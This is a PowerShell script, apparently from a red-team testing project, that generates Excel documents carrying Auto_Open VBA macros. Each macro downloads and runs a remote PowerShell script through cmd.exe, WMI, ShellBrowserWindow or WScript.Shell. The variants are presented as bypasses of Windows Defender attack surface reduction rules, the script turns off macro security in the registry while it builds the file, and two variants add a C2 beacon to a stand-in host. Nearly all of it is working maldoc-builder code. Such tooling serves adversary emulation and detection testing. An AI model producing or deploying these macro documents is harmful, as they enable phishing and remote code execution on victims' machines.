#Adopted and Originally Coded by Matt Nelson (@enigma0x3)
#Reference: https://github.com/enigma0x3/Generate-Macro/blob/master/Generate-Macro.ps1
 <#
    .SYNOPSIS

        Standalone Powershell script that will generate a malicious Microsoft Office document with a specified payload and persistence method

    .DESCRIPTION

        This script will generate malicious Microsoft Excel Documents that contain VBA macros.
        The script will display a menu of different attacks, all with different ASR Bypass methods. Once an attack is chosen.

When naming the document, don't include a file extension.

License: BSD 3-Clause
Required Dependencies: None
Optional Dependencies: None

    .Attack Types

        All 7 instances represent different ASR Bypasses based on research performed by great folks within the industry. All macros were absorbed from https://gist.github.com/infosecn1nja/24a733c5b3f0e5a8b6f0ca2cf75967e3.

    Additional references:

        - https://www.darkoperator.com/blog/2017/11/11/windows-defender-exploit-guard-asr-rules-for-office
        - https://www.darkoperator.com/blog/2017/11/6/windows-defender-exploit-guard-asr-vbscriptjs-rule
        - https://www.darkoperator.com/blog/2017/11/8/windows-defender-exploit-guard-asr-obfuscated-script-rule
        - https://posts.specterops.io/the-emet-attack-surface-reduction-replacement-in-windows-10-rs3-the-good-the-bad-and-the-ugly-34d5a253f3df
        - https://oddvar.moe/2018/03/15/windows-defender-attack-surface-reduction-rules-bypass/

    .EXAMPLE

        PS> ./Generate-Macro.ps1
        Enter the name of the document (Do not include a file extension): FinancialData

        --------Select Attack---------
        1. Chain Reaction Download and execute with Excel.
        2. Chain Reaction Download and execute with Excel, wmiprvse
        3. Chain Reaction Download and execute with Excel, wmiprvse benign
        4. Chain Reaction Download and execute with Excel Shell
        5. Chain Reaction Download and execute with Excel ShellBrowserWindow
        6. Chain Reaction Download and execute with Excel WshShell
        7. Chain Reaction Download and execute with Excel and POST C2.
        8. Chain Reaction Download and execute with Excel and GET C2.
        ------------------------------

        Saved to file C:\Users\Malware\Desktop\FinancialData.xls
        PS>

#>

$global:defLoc = "$env:userprofile\Desktop"
$global:Name = Read-Host "Enter the name of the document (Do not include a file extension)"
$global:Name = $global:Name + ".xls"
$global:FullName = "$global:defLoc\$global:Name"


function Excel-Shell {
<#
    .SYNOPSIS
      Standard macro execution.
    .DESCRIPTION
      Upon execution, Excel will spawn cmd.exe to download and execute a chain reaction via powershell.
#>
#create macro

$Code = @"
Sub Auto_Open()
    Call Shell("cmd.exe /c powershell.exe IEX ( IWR -uri 'https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/ARTifacts/Chain_Reactions/chain_reaction_DragonsTail.ps1')", 1)
End Sub
"@

#Create excel document
$Excel01 = New-Object -ComObject "Excel.Application"
$ExcelVersion = $Excel01.Version

#Disable Macro Security
New-ItemProperty -Path "HKCU:\Software\Microsoft\Office\$ExcelVersion\Excel\Security" -Name AccessVBOM -PropertyType DWORD -Value 1 -Force | Out-Null
New-ItemProperty -Path "HKCU:\Software\Microsoft\Office\$ExcelVersion\Excel\Security" -Name VBAWarnings -PropertyType DWORD -Value 1 -Force | Out-Null

$Excel01.DisplayAlerts = $false
$Excel01.DisplayAlerts = "wdAlertsNone"
$Excel01.Visible = $false
$Workbook01 = $Excel01.Workbooks.Add(1)
$Worksheet01 = $Workbook01.WorkSheets.Item(1)

$ExcelModule = $Workbook01.VBProject.VBComponents.Add(1)
$ExcelModule.CodeModule.AddFromString($Code)

#Save the document
Add-Type -AssemblyName Microsoft.Office.Interop.Excel
$Workbook01.SaveAs("$global:FullName", [Microsoft.Office.Interop.Excel.XlFileFormat]::xlExcel8)
Write-Output "Saved to file $global:Fullname"

#Cleanup
$Excel01.Workbooks.Close()
$Excel01.Quit()
[System.Runtime.Interopservices.Marshal]::ReleaseComObject($Excel01) | out-null
$Excel01 = $Null
if (ps excel){kill -name excel}

#Enable Macro Security
New-ItemProperty -Path "HKCU:\Software\Microsoft\Office\$ExcelVersion\Excel\Security" -Name AccessVBOM -PropertyType DWORD -Value 0 -Force | Out-Null
New-ItemProperty -Path "HKCU:\Software\Microsoft\Office\$ExcelVersion\Excel\Security" -Name VBAWarnings -PropertyType DWORD -Value 0 -Force | Out-Null

}

function Excel-Com-Wmiprvse-Benign-Trampoline {
<#
    .SYNOPSIS
        Uses COM to download and execute a chain reaction via wmiprvse. This version will not execute mimikatz.
    .DESCRIPTION
        Using COM, upon macro execution, wmiprvse will spawn cmd.exe to run powershell to download and execute a benign chain reaction.
#>

#create macro

$Code = @"
Sub Auto_Open()
    Const HIDDEN_WINDOW = 0
    strComputer = "."
    Set objWMIService = GetObject("win" & "mgmts" & ":\\" & strComputer & "\root" & "\cimv2")
    Set objStartup = objWMIService.Get("Win32_" & "Process" & "Startup")
    Set objConfig = objStartup.SpawnInstance_
    objConfig.ShowWindow = HIDDEN_WINDOW
    Set objProcess = GetObject("winmgmts:\\" & strComputer & "\root" & "\cimv2" & ":Win32_" & "Process")
    objProcess.Create "cmd.exe /c powershell.exe IEX ( IWR -uri 'https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/ARTifacts/Chain_Reactions/chain_reaction_DragonsTail_benign.ps1')", Null, objConfig, intProcessID
End Sub
"@

#Create excel document
$Excel01 = New-Object -ComObject "Excel.Application"
$ExcelVersion = $Excel01.Version

#Disable Macro Security
New-ItemProperty -Path "HKCU:\Software\Microsoft\Office\$ExcelVersion\Excel\Security" -Name AccessVBOM -PropertyType DWORD -Value 1 -Force | Out-Null
New-ItemProperty -Path "HKCU:\Software\Microsoft\Office\$ExcelVersion\Excel\Security" -Name VBAWarnings -PropertyType DWORD -Value 1 -Force | Out-Null

$Excel01.DisplayAlerts = $false
$Excel01.DisplayAlerts = "wdAlertsNone"
$Excel01.Visible = $false
$Workbook01 = $Excel01.Workbooks.Add(1)
$Worksheet01 = $Workbook01.WorkSheets.Item(1)

$ExcelModule = $Workbook01.VBProject.VBComponents.Add(1)
$ExcelModule.CodeModule.AddFromString($Code)

#Save the document
Add-Type -AssemblyName Microsoft.Office.Interop.Excel
$Workbook01.SaveAs("$global:FullName", [Microsoft.Office.Interop.Excel.XlFileFormat]::xlExcel8)
Write-Output "Saved to file $global:Fullname"

#Cleanup
$Excel01.Workbooks.Close()
$Excel01.Quit()
[System.Runtime.Interopservices.Marshal]::ReleaseComObject($Excel01) | out-null
$Excel01 = $Null
if (ps excel){kill -name excel}

#Enable Macro Security
New-ItemProperty -Path "HKCU:\Software\Microsoft\Office\$ExcelVersion\Excel\Security" -Name AccessVBOM -PropertyType DWORD -Value 0 -Force | Out-Null
New-ItemProperty -Path "HKCU:\Software\Microsoft\Office\$ExcelVersion\Excel\Security" -Name VBAWarnings -PropertyType DWORD -Value 0 -Force | Out-Null

}

function Excel-Com-Wmiprvse-Trampoline {
<#
    .SYNOPSIS
      Uses COM to download and execute chain reaction via wmiprvse.
    .DESCRIPTION
      Using COM, upon macro execution, wmiprvse will spawn cmd.exe to run powershell to download and execute a benign chain reaction.
#>

#create macro

$Code = @"
Sub Auto_Open()
    Const HIDDEN_WINDOW = 0
    strComputer = "."
    Set objWMIService = GetObject("win" & "mgmts" & ":\\" & strComputer & "\root" & "\cimv2")
    Set objStartup = objWMIService.Get("Win32_" & "Process" & "Startup")
    Set objConfig = objStartup.SpawnInstance_
    objConfig.ShowWindow = HIDDEN_WINDOW
    Set objProcess = GetObject("winmgmts:\\" & strComputer & "\root" & "\cimv2" & ":Win32_" & "Process")
    objProcess.Create "cmd.exe /c powershell.exe IEX ( IWR -uri 'https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/ARTifacts/Chain_Reactions/chain_reaction_DragonsTail.ps1')", Null, objConfig, intProcessID
End Sub
"@

#Create excel document
$Excel01 = New-Object -ComObject "Excel.Application"
$ExcelVersion = $Excel01.Version

#Disable Macro Security
New-ItemProperty -Path "HKCU:\Software\Microsoft\Office\$ExcelVersion\Excel\Security" -Name AccessVBOM -PropertyType DWORD -Value 1 -Force | Out-Null
New-ItemProperty -Path "HKCU:\Software\Microsoft\Office\$ExcelVersion\Excel\Security" -Name VBAWarnings -PropertyType DWORD -Value 1 -Force | Out-Null

$Excel01.DisplayAlerts = $false
$Excel01.DisplayAlerts = "wdAlertsNone"
$Excel01.Visible = $false
$Workbook01 = $Excel01.Workbooks.Add(1)
$Worksheet01 = $Workbook01.WorkSheets.Item(1)

$ExcelModule = $Workbook01.VBProject.VBComponents.Add(1)
$ExcelModule.CodeModule.AddFromString($Code)

#Save the document
Add-Type -AssemblyName Microsoft.Office.Interop.Excel
$Workbook01.SaveAs("$global:FullName", [Microsoft.Office.Interop.Excel.XlFileFormat]::xlExcel8)
Write-Output "Saved to file $global:Fullname"

#Cleanup
$Excel01.Workbooks.Close()
$Excel01.Quit()
[System.Runtime.Interopservices.Marshal]::ReleaseComObject($Excel01) | out-null
$Excel01 = $Null
if (ps excel){kill -name excel}

#Enable Macro Security
New-ItemProperty -Path "HKCU:\Software\Microsoft\Office\$ExcelVersion\Excel\Security" -Name AccessVBOM -PropertyType DWORD -Value 0 -Force | Out-Null
New-ItemProperty -Path "HKCU:\Software\Microsoft\Office\$ExcelVersion\Excel\Security" -Name VBAWarnings -PropertyType DWORD -Value 0 -Force | Out-Null

}

function Excel-Com-Trampoline {
<#
    .SYNOPSIS
      Excel COM Trampoline.
    .DESCRIPTION
      Using COM, upon macro execution, wmiprvse will spawn cmd.exe to run powershell to download and execute a chain reaction.
#>

#create macro

$Code = @"
Sub Auto_Open()
    Const ShellWindows = _
    "{9BA05972-F6A8-11CF-A442-00A0C90A8F39}"
    Set SW = GetObject("new:" & ShellWindows).Item()
    SW.Document.Application.ShellExecute "cmd.exe", "/c powershell.exe IWR -uri ""https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/ARTifacts/Chain_Reactions/chain_reaction_DragonsTail.ps1"" -OutFile ""~\Documents\payload.bat"" ; ~\Documents\payload.bat", "C:\Windows\System32", Null, 0
End Sub
"@

#Create excel document
$Excel01 = New-Object -ComObject "Excel.Application"
$ExcelVersion = $Excel01.Version

#Disable Macro Security
New-ItemProperty -Path "HKCU:\Software\Microsoft\Office\$ExcelVersion\Excel\Security" -Name AccessVBOM -PropertyType DWORD -Value 1 -Force | Out-Null
New-ItemProperty -Path "HKCU:\Software\Microsoft\Office\$ExcelVersion\Excel\Security" -Name VBAWarnings -PropertyType DWORD -Value 1 -Force | Out-Null

$Excel01.DisplayAlerts = $false
$Excel01.DisplayAlerts = "wdAlertsNone"
$Excel01.Visible = $false
$Workbook01 = $Excel01.Workbooks.Add(1)
$Worksheet01 = $Workbook01.WorkSheets.Item(1)

$ExcelModule = $Workbook01.VBProject.VBComponents.Add(1)
$ExcelModule.CodeModule.AddFromString($Code)

#Save the document
Add-Type -AssemblyName Microsoft.Office.Interop.Excel
$Workbook01.SaveAs("$global:FullName", [Microsoft.Office.Interop.Excel.XlFileFormat]::xlExcel8)
Write-Output "Saved to file $global:Fullname"

#Cleanup
$Excel01.Workbooks.Close()
$Excel01.Quit()
[System.Runtime.Interopservices.Marshal]::ReleaseComObject($Excel01) | out-null
$Excel01 = $Null
if (ps excel){kill -name excel}

#Enable Macro Security
New-ItemProperty -Path "HKCU:\Software\Microsoft\Office\$ExcelVersion\Excel\Security" -Name AccessVBOM -PropertyType DWORD -Value 0 -Force | Out-Null
New-ItemProperty -Path "HKCU:\Software\Microsoft\Office\$ExcelVersion\Excel\Security" -Name VBAWarnings -PropertyType DWORD -Value 0 -Force | Out-Null

}

function Excel-Com-ShellBrowserWindow {
<#
    .SYNOPSIS
      Excel COM Trampoline.
    .DESCRIPTION
      Using COM, upon macro execution, svchost/explorer will spawn cmd.exe to run powershell to download and execute a chain reaction.
#>

#create macro

$Code = @"
Sub Auto_Open()
    Const ShellBrowserWindow = _
    "{C08AFD90-F2A1-11D1-8455-00A0C91F3880}"
    Set SBW = GetObject("new:" & ShellBrowserWindow)
    SBW.Document.Application.ShellExecute "cmd.exe", "/c powershell.exe IWR -uri ""https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/ARTifacts/Chain_Reactions/chain_reaction_DragonsTail.ps1"" -OutFile ""~\Documents\payload.bat"" ; ~\Documents\payload.bat", "C:\Windows\System32", Null, 0
End Sub
"@

#Create excel document
$Excel01 = New-Object -ComObject "Excel.Application"
$ExcelVersion = $Excel01.Version

#Disable Macro Security
New-ItemProperty -Path "HKCU:\Software\Microsoft\Office\$ExcelVersion\Excel\Security" -Name AccessVBOM -PropertyType DWORD -Value 1 -Force | Out-Null
New-ItemProperty -Path "HKCU:\Software\Microsoft\Office\$ExcelVersion\Excel\Security" -Name VBAWarnings -PropertyType DWORD -Value 1 -Force | Out-Null

$Excel01.DisplayAlerts = $false
$Excel01.DisplayAlerts = "wdAlertsNone"
$Excel01.Visible = $false
$Workbook01 = $Excel01.Workbooks.Add(1)
$Worksheet01 = $Workbook01.WorkSheets.Item(1)

$ExcelModule = $Workbook01.VBProject.VBComponents.Add(1)
$ExcelModule.CodeModule.AddFromString($Code)

#Save the document
Add-Type -AssemblyName Microsoft.Office.Interop.Excel
$Workbook01.SaveAs("$global:FullName", [Microsoft.Office.Interop.Excel.XlFileFormat]::xlExcel8)
Write-Output "Saved to file $global:Fullname"

#Cleanup
$Excel01.Workbooks.Close()
$Excel01.Quit()
[System.Runtime.Interopservices.Marshal]::ReleaseComObject($Excel01) | out-null
$Excel01 = $Null
if (ps excel){kill -name excel}

#Enable Macro Security
New-ItemProperty -Path "HKCU:\Software\Microsoft\Office\$ExcelVersion\Excel\Security" -Name AccessVBOM -PropertyType DWORD -Value 0 -Force | Out-Null
New-ItemProperty -Path "HKCU:\Software\Microsoft\Office\$ExcelVersion\Excel\Security" -Name VBAWarnings -PropertyType DWORD -Value 0 -Force | Out-Null

}

function Excel-Com-wshshell {
<#
    .SYNOPSIS
      Excel COM WshShell.
    .DESCRIPTION
      Using COM, upon macro execution, svchost/explorer will spawn cmd.exe to run powershell to download and execute a chain reaction.
#>

#create macro

$Code = @"
Sub Auto_Open()
    Set WshShell = CreateObject("WScript.Shell")
    Set WshShellExec = WshShell.Exec("cmd.exe /c powershell.exe IEX ( IWR -uri 'https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/ARTifacts/Chain_Reactions/chain_reaction_DragonsTail.ps1')")
End Sub
"@

#Create excel document
$Excel01 = New-Object -ComObject "Excel.Application"
$ExcelVersion = $Excel01.Version

#Disable Macro Security
New-ItemProperty -Path "HKCU:\Software\Microsoft\Office\$ExcelVersion\Excel\Security" -Name AccessVBOM -PropertyType DWORD -Value 1 -Force | Out-Null
New-ItemProperty -Path "HKCU:\Software\Microsoft\Office\$ExcelVersion\Excel\Security" -Name VBAWarnings -PropertyType DWORD -Value 1 -Force | Out-Null

$Excel01.DisplayAlerts = $false
$Excel01.DisplayAlerts = "wdAlertsNone"
$Excel01.Visible = $false
$Workbook01 = $Excel01.Workbooks.Add(1)
$Worksheet01 = $Workbook01.WorkSheets.Item(1)

$ExcelModule = $Workbook01.VBProject.VBComponents.Add(1)
$ExcelModule.CodeModule.AddFromString($Code)

#Save the document
Add-Type -AssemblyName Microsoft.Office.Interop.Excel
$Workbook01.SaveAs("$global:FullName", [Microsoft.Office.Interop.Excel.XlFileFormat]::xlExcel8)
Write-Output "Saved to file $global:Fullname"

#Cleanup
$Excel01.Workbooks.Close()
$Excel01.Quit()
[System.Runtime.Interopservices.Marshal]::ReleaseComObject($Excel01) | out-null
$Excel01 = $Null
if (ps excel){kill -name excel}

#Enable Macro Security
New-ItemProperty -Path "HKCU:\Software\Microsoft\Office\$ExcelVersion\Excel\Security" -Name AccessVBOM -PropertyType DWORD -Value 0 -Force | Out-Null
New-ItemProperty -Path "HKCU:\Software\Microsoft\Office\$ExcelVersion\Excel\Security" -Name VBAWarnings -PropertyType DWORD -Value 0 -Force | Out-Null

}

function Excel-Shell-C2-GET {
<#
    .SYNOPSIS
      Standard macro execution.
    .DESCRIPTION
      Upon execution, Excel will spawn cmd.exe to download and execute a chain reaction via powershell.
#>

#create macro

$Code = @"
Sub Auto_Open()

Execute
C2

End Sub

Public Function Execute() As Variant
    Call Shell("cmd.exe /c powershell.exe IEX ( IWR -uri 'https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/ARTifacts/Chain_Reactions/chain_reaction_DragonsTail.ps1')", 1)
End Function

Public Function C2() As Variant
Set objHTTP = CreateObject("WinHttp.WinHttpRequest.5.1")
URL = "http://www.example.com"
objHTTP.Open "GET", URL, False
objHTTP.setRequestHeader "User-Agent", "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.0)"
objHTTP.setRequestHeader "Content-type", "application/x-www-form-urlencoded"
objHTTP.send ("ART=AtomicRedTeam")
End Function
"@

#Create excel document
$Excel01 = New-Object -ComObject "Excel.Application"
$ExcelVersion = $Excel01.Version

#Disable Macro Security
New-ItemProperty -Path "HKCU:\Software\Microsoft\Office\$ExcelVersion\Excel\Security" -Name AccessVBOM -PropertyType DWORD -Value 1 -Force | Out-Null
New-ItemProperty -Path "HKCU:\Software\Microsoft\Office\$ExcelVersion\Excel\Security" -Name VBAWarnings -PropertyType DWORD -Value 1 -Force | Out-Null

$Excel01.DisplayAlerts = $false
$Excel01.DisplayAlerts = "wdAlertsNone"
$Excel01.Visible = $false
$Workbook01 = $Excel01.Workbooks.Add(1)
$Worksheet01 = $Workbook01.WorkSheets.Item(1)

$ExcelModule = $Workbook01.VBProject.VBComponents.Add(1)
$ExcelModule.CodeModule.AddFromString($Code)

#Save the document
Add-Type -AssemblyName Microsoft.Office.Interop.Excel
$Workbook01.SaveAs("$global:FullName", [Microsoft.Office.Interop.Excel.XlFileFormat]::xlExcel8)
Write-Output "Saved to file $global:Fullname"

#Cleanup
$Excel01.Workbooks.Close()
$Excel01.Quit()
[System.Runtime.Interopservices.Marshal]::ReleaseComObject($Excel01) | out-null
$Excel01 = $Null
if (ps excel){kill -name excel}

#Enable Macro Security
New-ItemProperty -Path "HKCU:\Software\Microsoft\Office\$ExcelVersion\Excel\Security" -Name AccessVBOM -PropertyType DWORD -Value 0 -Force | Out-Null
New-ItemProperty -Path "HKCU:\Software\Microsoft\Office\$ExcelVersion\Excel\Security" -Name VBAWarnings -PropertyType DWORD -Value 0 -Force | Out-Null

}

function Excel-Shell-C2-POST {
<#
    .SYNOPSIS
      Standard macro execution.
    .DESCRIPTION
      Upon execution, Excel will spawn cmd.exe to download and execute a chain reaction via powershell.
#>

#create macro

$Code = @"
Sub Auto_Open()

Execute
C2

End Sub

Public Function Execute() As Variant
    Call Shell("cmd.exe /c powershell.exe IEX ( IWR -uri 'https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/ARTifacts/Chain_Reactions/chain_reaction_DragonsTail.ps1')", 1)
End Function

Public Function C2() As Variant
Set objHTTP = CreateObject("WinHttp.WinHttpRequest.5.1")
URL = "http://www.example.com"
objHTTP.Open "POST", URL, False
objHTTP.setRequestHeader "User-Agent", "Mozilla (compatible; MSIE 6.0; Windows NT 5.0)"
objHTTP.setRequestHeader "Content-type", "application/x-www-form-urlencoded"
objHTTP.send ("ART=AtomicRedTeam")
End Function
"@

#Create excel document
$Excel01 = New-Object -ComObject "Excel.Application"
$ExcelVersion = $Excel01.Version

#Disable Macro Security
New-ItemProperty -Path "HKCU:\Software\Microsoft\Office\$ExcelVersion\Excel\Security" -Name AccessVBOM -PropertyType DWORD -Value 1 -Force | Out-Null
New-ItemProperty -Path "HKCU:\Software\Microsoft\Office\$ExcelVersion\Excel\Security" -Name VBAWarnings -PropertyType DWORD -Value 1 -Force | Out-Null

$Excel01.DisplayAlerts = $false
$Excel01.DisplayAlerts = "wdAlertsNone"
$Excel01.Visible = $false
$Workbook01 = $Excel01.Workbooks.Add(1)
$Worksheet01 = $Workbook01.WorkSheets.Item(1)

$ExcelModule = $Workbook01.VBProject.VBComponents.Add(1)
$ExcelModule.CodeModule.AddFromString($Code)

#Save the document
Add-Type -AssemblyName Microsoft.Office.Interop.Excel
$Workbook01.SaveAs("$global:FullName", [Microsoft.Office.Interop.Excel.XlFileFormat]::xlExcel8)
Write-Output "Saved to file $global:Fullname"

#Cleanup
$Excel01.Workbooks.Close()
$Excel01.Quit()
[System.Runtime.Interopservices.Marshal]::ReleaseComObject($Excel01) | out-null
$Excel01 = $Null
if (ps excel){kill -name excel}

#Enable Macro Security
New-ItemProperty -Path "HKCU:\Software\Microsoft\Office\$ExcelVersion\Excel\Security" -Name AccessVBOM -PropertyType DWORD -Value 0 -Force | Out-Null
New-ItemProperty -Path "HKCU:\Software\Microsoft\Office\$ExcelVersion\Excel\Security" -Name VBAWarnings -PropertyType DWORD -Value 0 -Force | Out-Null

}

#Determine Attack
Do {
Write-Host "
--------Select Attack---------
1. Chain Reaction Download and execute with Excel.
2. Chain Reaction Download and execute with Excel, wmiprvse
3. Chain Reaction Download and execute with Excel, wmiprvse benign
4. Chain Reaction Download and execute with Excel Shell
5. Chain Reaction Download and execute with Excel ShellBrowserWindow
6. Chain Reaction Download and execute with Excel WshShell
7. Chain Reaction Download and execute with Excel and POST C2.
8. Chain Reaction Download and execute with Excel and GET C2.
------------------------------"
$AttackNum = Read-Host -prompt "Select Attack Number & Press Enter"
} until ($AttackNum -eq "1" -or $AttackNum -eq "2" -or $AttackNum -eq "3" -or $AttackNum -eq "4" -or $AttackNum -eq "5" -or $AttackNum -eq "6" -or $AttackNum -eq "7" -or $AttackNum -eq "8")


#Initiate Attack Choice

if($AttackNum -eq "1"){
    Excel-Com-Trampoline
}
elseif($AttackNum -eq "2"){
    Excel-Com-Wmiprvse-Trampoline
}
elseif($AttackNum -eq "3"){
    Excel-Com-Wmiprvse-Benign-Trampoline
}
elseif($AttackNum -eq "4"){
    Excel-Shell
}
elseif($AttackNum -eq "5"){
    Excel-Com-ShellBrowserWindow
}
elseif($AttackNum -eq "6"){
    Excel-Com-wshshell
}
elseif($AttackNum -eq "7"){
    Excel-Shell-C2-POST
}
elseif($AttackNum -eq "8"){
    Excel-Shell-C2-GET
}
